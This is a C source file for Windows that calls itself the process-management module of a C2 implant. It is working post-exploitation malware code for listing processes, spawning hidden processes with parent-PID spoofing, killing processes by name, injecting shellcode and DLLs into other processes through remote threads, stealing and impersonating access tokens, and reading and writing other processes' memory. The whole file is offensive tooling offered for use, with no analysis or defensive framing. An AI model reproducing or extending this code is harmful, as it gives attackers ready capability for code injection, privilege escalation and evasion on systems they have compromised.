/*
 * Process Operations - Enum, spawn, kill, inject
 * C2 implant process management
 */

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// ============================================================================
// PROCESS INFO
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD pid;
    DWORD ppid;
    DWORD threads;
    char  name[260];
    char  path[260];
    DWORD session;
    BOOL  wow64;
    char  user[128];
} PROC_INFO;
#pragma pack(pop)

// ============================================================================
// PROCESS LIST
// ============================================================================

DWORD proc_list(PROC_INFO** list)
{
    HANDLE snap = CreateToolhelp32Snapshot(2, 0);
    if(snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD cnt = 0;

    if(Process32First(snap, &pe)) {
        do { cnt++; } while(Process32Next(snap, &pe));
    }

    *list = HeapAlloc(GetProcessHeap(), 8, cnt * sizeof(PROC_INFO));

    int i = 0;
    if(Process32First(snap, &pe)) {
        do {
            (*list)[i].pid = pe.th32ProcessID;
            (*list)[i].ppid = pe.th32ParentProcessID;
            (*list)[i].threads = pe.cntThreads;
            lstrcpyA((*list)[i].name, pe.szExeFile);

            HANDLE h = OpenProcess(0x1000, 0, pe.th32ProcessID);  // QUERY_LIMITED_INFORMATION
            if(h) {
                DWORD sz = 260;
                QueryFullProcessImageNameA(h, 0, (*list)[i].path, &sz);
                ProcessIdToSessionId(pe.th32ProcessID, &(*list)[i].session);

                BOOL w64 = 0;
                IsWow64Process(h, &w64);
                (*list)[i].wow64 = w64;

                HANDLE ht;
                if(OpenProcessToken(h, 8, &ht)) {  // TOKEN_QUERY
                    DWORD len;
                    GetTokenInformation(ht, 1, 0, 0, &len);  // TokenUser
                    PTOKEN_USER u = HeapAlloc(GetProcessHeap(), 0, len);
                    if(GetTokenInformation(ht, 1, u, len, &len)) {
                        char n[64], d[64];
                        DWORD nl = 64, dl = 64;
                        SID_NAME_USE snu;
                        if(LookupAccountSidA(0, u->User.Sid, n, &nl, d, &dl, &snu))
                            wsprintfA((*list)[i].user, "%s\\%s", d, n);
                    }
                    HeapFree(GetProcessHeap(), 0, u);
                    CloseHandle(ht);
                }
                CloseHandle(h);
            }
            i++;
        } while(Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return cnt;
}

char* proc_list_fmt(void)
{
    static char buf[0x100000];
    int pos = 0;

    PROC_INFO* list;
    DWORD cnt = proc_list(&list);

    pos += wsprintfA(buf + pos, "%-6s %-6s %-4s %-30s %s\n",
        "PID", "PPID", "ARCH", "NAME", "USER");

    for(DWORD i = 0; i < cnt && pos < 0xFF000; i++) {
        pos += wsprintfA(buf + pos, "%-6d %-6d %-4s %-30s %s\n",
            list[i].pid, list[i].ppid,
            list[i].wow64 ? "x86" : "x64",
            list[i].name, list[i].user);
    }

    HeapFree(GetProcessHeap(), 0, list);
    return buf;
}

// ============================================================================
// FIND PROCESS
// ============================================================================

DWORD proc_find(char* name)
{
    HANDLE snap = CreateToolhelp32Snapshot(2, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};

    if(Process32First(snap, &pe)) {
        do {
            if(lstrcmpiA(pe.szExeFile, name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while(Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return 0;
}

DWORD proc_find_all(char* name, DWORD* pids, DWORD max)
{
    HANDLE snap = CreateToolhelp32Snapshot(2, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD cnt = 0;

    if(Process32First(snap, &pe)) {
        do {
            if(lstrcmpiA(pe.szExeFile, name) == 0 && cnt < max)
                pids[cnt++] = pe.th32ProcessID;
        } while(Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return cnt;
}

// ============================================================================
// SPAWN PROCESS
// ============================================================================

#pragma pack(push,1)
typedef struct {
    char* path;
    char* args;
    char* cwd;
    BOOL  hidden;
    BOOL  suspended;
    DWORD parent_pid;  // PPID spoofing
} SPAWN_OPTS;
#pragma pack(pop)

DWORD proc_spawn(SPAWN_OPTS* opts, HANDLE* hP, HANDLE* hT)
{
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T sz = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST al = 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if(opts->hidden) {
        si.StartupInfo.dwFlags = 1;
        si.StartupInfo.wShowWindow = 0;
    }

    DWORD flags = 0;
    if(opts->suspended) flags |= 4;
    if(opts->hidden) flags |= 0x08000000;

    HANDLE hParent = 0;
    if(opts->parent_pid) {
        flags |= 0x80000;  // EXTENDED_STARTUPINFO_PRESENT

        InitializeProcThreadAttributeList(0, 1, 0, &sz);
        al = HeapAlloc(GetProcessHeap(), 0, sz);
        InitializeProcThreadAttributeList(al, 1, 0, &sz);

        hParent = OpenProcess(0x80, 0, opts->parent_pid);  // PROCESS_CREATE_PROCESS
        if(hParent) {
            UpdateProcThreadAttribute(al, 0, 0x20000,  // PARENT_PROCESS
                &hParent, sizeof(hParent), 0, 0);
            si.lpAttributeList = al;
        }
    }

    char cmdline[2048];
    if(opts->args)
        wsprintfA(cmdline, "\"%s\" %s", opts->path, opts->args);
    else
        wsprintfA(cmdline, "\"%s\"", opts->path);

    BOOL ret = CreateProcessA(0, cmdline, 0, 0, 0,
        flags, 0, opts->cwd, &si.StartupInfo, &pi);

    if(al) {
        DeleteProcThreadAttributeList(al);
        HeapFree(GetProcessHeap(), 0, al);
    }
    if(hParent) CloseHandle(hParent);

    if(!ret) return 0;

    if(hP) *hP = pi.hProcess;
    else CloseHandle(pi.hProcess);

    if(hT) *hT = pi.hThread;
    else CloseHandle(pi.hThread);

    return pi.dwProcessId;
}

DWORD proc_spawn_simple(char* path, char* args)
{
    SPAWN_OPTS o = {0};
    o.path = path;
    o.args = args;
    o.hidden = 1;
    return proc_spawn(&o, 0, 0);
}

// ============================================================================
// KILL PROCESS
// ============================================================================

BOOL proc_kill(DWORD pid)
{
    HANDLE h = OpenProcess(1, 0, pid);  // TERMINATE
    if(!h) return 0;

    BOOL ret = TerminateProcess(h, 0);
    CloseHandle(h);
    return ret;
}

DWORD proc_kill_name(char* name)
{
    DWORD pids[64];
    DWORD cnt = proc_find_all(name, pids, 64);
    DWORD killed = 0;

    for(DWORD i = 0; i < cnt; i++) {
        if(proc_kill(pids[i])) killed++;
    }
    return killed;
}

// ============================================================================
// INJECT SHELLCODE
// ============================================================================

BOOL proc_inject(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);  // ALL_ACCESS
    if(!h) return 0;

    LPVOID mem = VirtualAllocEx(h, 0, len, 0x3000, 0x40);
    if(!mem) {
        CloseHandle(h);
        return 0;
    }

    SIZE_T wr;
    if(!WriteProcessMemory(h, mem, sc, len, &wr)) {
        VirtualFreeEx(h, mem, 0, 0x8000);
        CloseHandle(h);
        return 0;
    }

    HANDLE ht = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
    if(!ht) {
        VirtualFreeEx(h, mem, 0, 0x8000);
        CloseHandle(h);
        return 0;
    }

    CloseHandle(ht);
    CloseHandle(h);
    return 1;
}

// ============================================================================
// INJECT DLL
// ============================================================================

BOOL proc_inject_dll(DWORD pid, char* dll)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);
    if(!h) return 0;

    DWORD len = lstrlenA(dll) + 1;
    LPVOID mem = VirtualAllocEx(h, 0, len, 0x3000, 4);
    if(!mem) {
        CloseHandle(h);
        return 0;
    }

    SIZE_T wr;
    WriteProcessMemory(h, mem, dll, len, &wr);

    LPVOID pLoad = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
    HANDLE ht = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)pLoad, mem, 0, 0);

    if(ht) {
        WaitForSingleObject(ht, 5000);
        CloseHandle(ht);
    }

    VirtualFreeEx(h, mem, 0, 0x8000);
    CloseHandle(h);
    return ht != 0;
}

// ============================================================================
// STEAL TOKEN
// ============================================================================

BOOL proc_steal_token(DWORD pid)
{
    HANDLE h = OpenProcess(0x400, 0, pid);  // QUERY_INFORMATION
    if(!h) return 0;

    HANDLE ht, hd;
    if(!OpenProcessToken(h, 0xA, &ht)) {  // DUPLICATE | QUERY
        CloseHandle(h);
        return 0;
    }

    if(!DuplicateTokenEx(ht, 0xF01FF, 0, 2, 1, &hd)) {
        CloseHandle(ht);
        CloseHandle(h);
        return 0;
    }

    BOOL ret = ImpersonateLoggedOnUser(hd);

    CloseHandle(hd);
    CloseHandle(ht);
    CloseHandle(h);
    return ret;
}

// ============================================================================
// MODULES
// ============================================================================

DWORD proc_modules(DWORD pid, HMODULE* mods, DWORD max)
{
    HANDLE h = OpenProcess(0x410, 0, pid);  // QUERY_INFORMATION | VM_READ
    if(!h) return 0;

    DWORD needed;
    if(!EnumProcessModules(h, mods, max * sizeof(HMODULE), &needed)) {
        CloseHandle(h);
        return 0;
    }

    CloseHandle(h);
    return needed / sizeof(HMODULE);
}

BOOL proc_module_path(DWORD pid, HMODULE mod, char* path, DWORD len)
{
    HANDLE h = OpenProcess(0x410, 0, pid);
    if(!h) return 0;

    BOOL ret = GetModuleFileNameExA(h, mod, path, len);
    CloseHandle(h);
    return ret;
}

// ============================================================================
// MEMORY
// ============================================================================

BOOL proc_read(DWORD pid, LPVOID addr, BYTE* buf, DWORD len)
{
    HANDLE h = OpenProcess(0x10, 0, pid);  // VM_READ
    if(!h) return 0;

    SIZE_T rd;
    BOOL ret = ReadProcessMemory(h, addr, buf, len, &rd);
    CloseHandle(h);
    return ret;
}

BOOL proc_write(DWORD pid, LPVOID addr, BYTE* buf, DWORD len)
{
    HANDLE h = OpenProcess(0x28, 0, pid);  // VM_WRITE | VM_OPERATION
    if(!h) return 0;

    SIZE_T wr;
    BOOL ret = WriteProcessMemory(h, addr, buf, len, &wr);
    CloseHandle(h);
    return ret;
}

// ============================================================================
// EOF
// ============================================================================
